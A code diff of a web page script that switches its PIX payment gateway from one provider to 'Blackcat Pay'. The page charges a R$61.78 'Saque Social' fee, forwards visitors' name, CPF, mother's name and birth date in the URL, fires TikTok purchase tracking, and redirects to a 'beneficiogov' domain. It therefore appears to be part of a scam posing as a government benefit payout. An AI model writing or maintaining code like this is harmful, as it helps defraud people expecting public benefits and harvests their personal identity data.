@@ -292,10 +292,10 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
 <script>
   // ===================================================
-  // CONFIGURAÇÃO — DUTTYFY PIX
+  // CONFIGURAÇÃO — BLACKCAT PAY
   // ===================================================
-  // URL encriptada: Duttyfy painel → Integrações e Chaves → Chaves API → "Gerar URL Encriptada"
-  var DUTTYFY_URL       = 'https://www.pagamentos-seguros.app/api-pix/WLNRLz1YKGO3K-5upiS55qWgy9rxn27RKsXBEKTDpqxpp2DL1DS3wmP_cCq7YmANdJOM3LQ8a2sitvsczloq7A';
+  var BLACKCAT_API_URL  = 'https://api.blackcatpay.com.br/api';
+  var BLACKCAT_API_KEY  = 'sua_api_key_aqui'; // ← Substitua pela sua API Key do painel Blackcat
   var PIX_VALOR_CENTS   = 6178;
   var PIX_DESCRICAO     = 'Saque Social';
   var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
@@ -323,9 +323,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   }
   function gerarProtocolo() {
     return new Date().getFullYear()+'.'+Math.floor(Math.random()*900000+100000)+'.'+Math.floor(Math.random()*9000+1000);
-  }
-  function gerarReference() {
-    return 'GOV-'+Date.now()+'-'+Math.floor(Math.random()*9999);
   }
 
   var nomeOk = formatarNome(_nome);
@@ -372,16 +369,15 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         currency:       'BRL',
         value:          parseFloat((PIX_VALOR_CENTS / 100).toFixed(2)),
         quantity:       1,
-        transaction_id: String(_pixTxid) // evita contagem dupla no TikTok Ads
+        transaction_id: String(_pixTxid)
       });
       console.log('[TTQ] Purchase ✓ valor=R$' + (PIX_VALOR_CENTS/100).toFixed(2) + ' txid=' + _pixTxid);
     } catch(e) {}
   }
 
   // ===================================================
-  // GERA PIX — DUTTYFY
-  // POST direto na URL encriptada (projeto estático sem backend próprio)
-  // Docs: frontend captura utm da URL e repassa como string bruta
+  // GERA PIX — BLACKCAT PAY
+  // POST /sales/create-sale com X-API-Key no header
   // ===================================================
   async function pixIniciar() {
     document.getElementById('pix-loading').style.display = 'block';
@@ -400,40 +396,66 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       var emailEnvio = _email && _email.indexOf('@') > 0 ? _email : 'pagador@gmail.com';
       var foneEnvio  = (_fone || '11999999999').replace(/\D/g,'');
 
-      // Captura todos os parâmetros de rastreamento da URL como string bruta
-      var utmString = window.location.search.replace(/^\?/, '');
+      // Captura parâmetros UTM individuais da URL
+      var utmSource   = _p.get('utm_source')   || '';
+      var utmMedium   = _p.get('utm_medium')   || '';
+      var utmCampaign = _p.get('utm_campaign') || '';
+      var utmContent  = _p.get('utm_content')  || '';
+      var utmTerm     = _p.get('utm_term')     || '';
 
       var payload = {
         amount:        PIX_VALOR_CENTS,
-        paymentMethod: 'PIX',
+        currency:      'BRL',
+        paymentMethod: 'pix',
+        items: [
+          {
+            title:     PIX_DESCRICAO,
+            unitPrice: PIX_VALOR_CENTS,
+            quantity:  1,
+            tangible:  false
+          }
+        ],
         customer: {
-          name:     nomeEnvio,
-          document: cpfEnvio,
-          email:    emailEnvio,
-          phone:    foneEnvio
+          name:  nomeEnvio,
+          email: emailEnvio,
+          phone: foneEnvio,
+          document: {
+            number: cpfEnvio,
+            type:   'cpf'
+          }
         },
-        item: {
-          title:    PIX_DESCRICAO,
-          price:    PIX_VALOR_CENTS,
-          quantity: 1
-        },
-        utm: utmString   // todos os params da URL: utms, src, sck, etc.
+        pix: {
+          expiresInDays: 1
+        }
       };
 
-      console.log('Duttyfy payload:', JSON.stringify(payload));
+      // Adiciona UTMs ao payload apenas se existirem
+      if (utmSource)   payload.utm_source   = utmSource;
+      if (utmMedium)   payload.utm_medium   = utmMedium;
+      if (utmCampaign) payload.utm_campaign = utmCampaign;
+      if (utmContent)  payload.utm_content  = utmContent;
+      if (utmTerm)     payload.utm_term     = utmTerm;
 
-      var res = await fetch(DUTTYFY_URL, {
+      console.log('Blackcat payload:', JSON.stringify(payload));
+
+      var res = await fetch(BLACKCAT_API_URL + '/sales/create-sale', {
         method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(payload)
+        headers: {
+          'Content-Type': 'application/json',
+          'X-API-Key':    BLACKCAT_API_KEY
+        },
+        body: JSON.stringify(payload)
       });
       var data = await res.json();
-      console.log('Duttyfy resposta:', JSON.stringify(data));
+      console.log('Blackcat resposta:', JSON.stringify(data));
 
-      if (!res.ok || !data.pixCode) throw new Error('Erro ' + res.status + ': ' + JSON.stringify(data));
+      // Valida resposta: espera data.data.paymentData.copyPaste
+      if (!res.ok || !data.success || !data.data || !data.data.paymentData || !data.data.paymentData.copyPaste) {
+        throw new Error('Erro ' + res.status + ': ' + (data.message || JSON.stringify(data)));
+      }
 
-      _pixTxid = data.transactionId;  // UUID retornado pela Duttyfy
-      _pixCode = data.pixCode;        // string EMV para gerar QR Code
+      _pixTxid = data.data.transactionId;           // ex: "TXN-1733654321-ABC123"
+      _pixCode = data.data.paymentData.copyPaste;   // string EMV para copia e cola
 
       document.getElementById('pix-proto-num').textContent   = gerarProtocolo();
       document.getElementById('pix-nome-show').textContent   = nomeOk || 'Cliente';
@@ -441,11 +463,15 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       document.getElementById('pix-valor-label').textContent = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
       document.getElementById('pix-code-box').textContent    = _pixCode;
 
-      // Duttyfy não retorna base64 — gera QR Code a partir da string pixCode
+      // QR Code: usa base64 da Blackcat se disponível, senão gera via qrserver
       var wrap = document.getElementById('pix-qr-img');
       wrap.innerHTML = '';
       var imgEl = document.createElement('img');
-      imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode);
+      if (data.data.paymentData.qrCodeBase64) {
+        imgEl.src = data.data.paymentData.qrCodeBase64;
+      } else {
+        imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode);
+      }
       imgEl.alt = 'QR Code PIX';
       imgEl.style.cssText = 'border-radius:8px;max-width:190px;';
       wrap.appendChild(imgEl);
@@ -469,30 +495,32 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   }
 
   // ===================================================
-  // POLLING — DUTTYFY
-  // GET {DUTTYFY_URL}?transactionId={uuid}
-  // Status aprovado: "COMPLETED"
+  // POLLING — BLACKCAT PAY
+  // GET /sales/{transactionId}/status
+  // Status aprovado: "PAID"
   // ===================================================
   function pixPolling() {
     if (!_pixTxid) { console.error('Polling: txid vazio.'); return; }
-    console.log('Polling Duttyfy para transactionId:', _pixTxid);
+    console.log('Polling Blackcat para transactionId:', _pixTxid);
     var tentativas = 0;
     _pixTimer = setInterval(async function() {
       tentativas++;
       if (tentativas > 180) { clearInterval(_pixTimer); return; }
       try {
         var r = await fetch(
-          DUTTYFY_URL + '?transactionId=' + encodeURIComponent(_pixTxid)
+          BLACKCAT_API_URL + '/sales/' + encodeURIComponent(_pixTxid) + '/status',
+          {
+            headers: { 'X-API-Key': BLACKCAT_API_KEY }
+          }
         );
         var s = await r.json();
-        console.log('Polling tentativa ' + tentativas + ':', s.status);
+        console.log('Polling tentativa ' + tentativas + ':', s.data && s.data.status);
 
-        if (s.status === 'COMPLETED') {
+        if (s.success && s.data && s.data.status === 'PAID') {
           clearInterval(_pixTimer);
           clearInterval(_timerInterval);
           console.log('✅ PAGAMENTO APROVADO — redirecionando para:', PIX_REDIRECT);
 
-          // ✅ TikTok Purchase com transaction_id para deduplicação no TikTok Ads
           ttqPurchase();
 
           // Monta URL de redirect repassando TODOS os parâmetros da URL atual
@@ -500,14 +528,13 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             try {
               var base   = new URL(PIX_REDIRECT);
               var params = new URLSearchParams(window.location.search);
-              // Repassa nome, cpf, mae, nascimento, utms, etc.
               params.forEach(function(value, key) {
                 base.searchParams.set(key, value);
               });
               console.log('Redirect final:', base.toString());
               window.location.href = base.toString();
             } catch(e) {
-              window.location.href = PIX_REDIRECT; // fallback
+              window.location.href = PIX_REDIRECT;
             }
           }, 800);
         }
